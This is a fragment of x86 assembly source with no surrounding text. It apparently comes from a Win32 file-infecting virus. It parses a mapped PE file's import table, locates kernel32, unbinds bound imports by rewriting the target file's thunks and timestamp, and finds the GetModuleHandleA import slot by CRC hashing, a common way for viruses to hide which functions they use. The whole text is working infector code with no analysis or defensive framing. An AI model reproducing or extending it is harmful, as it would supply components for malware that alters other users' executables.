DEBUGOFF

Import PROC
       pushad
       mov eax, [peheader]
       mov ebx, [eax.OH_DataDirectory. \
                 DE_Import. \
                 DD_Size + \
                 IMAGE_SIZEOF_FILE_HEADER+4]
       test ebx, ebx                           ;no imports, error
       jz @@error
       mov eax, [eax.OH_DataDirectory. \
                 DE_Import. \
                 DD_VirtualAddress + \
                 IMAGE_SIZEOF_FILE_HEADER+4]
       call RVA2RAW                            ;get first import directory
       jc @@error
       mov ebx, [fmap]
  @@check_dll:
       push eax
       mov eax, [eax.ebx.ID_Name]              ;pointer to DLL name
       test eax, eax                           ;null? error
       jz @@error_pop
       call RVA2RAW                            ;convert in RAW ptr
       jc @@error_pop

       mov ecx, [eax.ebx+4]
       mov eax, [eax.ebx]
       or eax, 20202020h                       ;make string lowcase
       sub eax, 'nrek'
       pop eax
       jnz @@next_dll                          ;kern
       or ecx, 2020h
       sub ecx, '23le'                         ;el32
       jz @@found
  @@next_dll:
       sub eax, -IMAGE_SIZEOF_IMPORT_DESCRIPTOR
       jmp @@check_dll                         ;verify next DLL import

  @@error_pop:
       add esp, 4                              ;clear stack
       jmp @@error

  @@found:
       mov ecx, [eax.ebx.ID_TimeDateStamp]
       jecxz @@no_bound                           ;bound import?

       mov ecx, [eax.ebx.ID_OriginalFirstThunk]
       test ecx, ecx
       jz @@error

       pushad
       mov edi,[eax.ebx.ID_FirstThunk]
       mov eax,ecx
       call RVA2RAW                            ;get real import directory
       jc @@error666
       lea esi,[eax+ebx]
       mov eax,edi
       call RVA2RAW                            ;get bound import directory
       jc @@error666
       lea edi,[eax+ebx]
  @@cpy_import:
       lodsd
       stosd
       test eax,eax
       jnz @@cpy_import
  @@error666:
       popad
       jc @@error
       sub ecx, ecx
       mov [eax.ebx.ID_TimeDateStamp], ecx     ;unbound it

  @@no_bound:
       mov eax, [eax.ebx.ID_FirstThunk]
       mov edx, eax                            ;edx=RVA of RVA list of name
       call RVA2RAW
       lea esi, [eax+ebx]                      ;esi=RAW to RVA list of name

  @@check_next_api:
       lodsd
       test eax,eax
       jz @@error
       bt eax, 31
       jc @@check_next_api666                 ;import by ordinal?
       call RVA2RAW
       jc @@check_next_api666
       push esi
       lea esi, [eax.ebx.IBN_Name]             ;get name of requested API
       call GetCRC
       pop esi
       cmp eax, 12345678h
     org $-4
     crc <GetModuleHandleA>
       je @@sucess

  @@check_next_api666:
       add edx,4
       jmp @@check_next_api

  @@sucess:
       mov [GMH], edx
       popad
       ret
  @@error:
       stc                                     ;signal error
       popad
       ret
Import ENDP

RVA2RAW PROC
       pushad
       mov esi, [peheader]
       movzx ecx, wo [esi.NT_FileHeader.FH_NumberOfSections]
       add esi, SIZE IMAGE_NT_HEADERS          ;start of sections headers
  @@1:
       mov ebx, eax
       sub ebx, [esi.SH_VirtualAddress]
       cmp ebx, [esi.SH_VirtualSize]           ;RVA point inside this section?
       jb @@2
       add esi, IMAGE_SIZEOF_SECTION_HEADER
       dec ecx
       jnz @@1                                 ;check next section header
       popad
       stc                                     ;RVA dont exists in file
       ret
  @@2:
       add ebx, [esi.SH_PointerToRawData]      ;transform RVA to RAW
       mov [esp.Pushad_eax], ebx
       popad
       ret
RVA2RAW ENDP
